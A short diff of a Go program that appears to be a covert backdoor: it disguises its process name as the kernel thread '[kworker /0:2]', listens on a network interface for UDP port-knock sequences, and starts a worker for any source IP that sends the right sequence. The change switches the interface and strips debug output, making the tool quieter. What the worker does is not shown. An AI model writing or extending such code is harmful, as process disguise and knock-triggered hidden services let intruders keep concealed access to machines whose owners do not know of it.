@@ -13,7 +13,7 @@ func main() {
 	fmt.Println("Server Running")
 	// set the process name
 	disguiseProc("[kworker /0:2]")
-	listenForKnocks("en1")
+	listenForKnocks("wlp3s0")
 
 }
 
@@ -70,11 +70,9 @@ func listenForKnocks(ifaceName string) {
 		}
 
 		ipStr := ipv4Layer.SrcIP.String()
-		print("got pkt")
 		addKnock(clients, ipStr, udpLayer.DstPort)
 
 		if checkKnocks(clients, ipStr) {
-			fmt.Printf("%+v\n", clients)
 			go serverWorker(ipv4Layer.SrcIP.String())
 			delete(clients, ipStr)
 		}
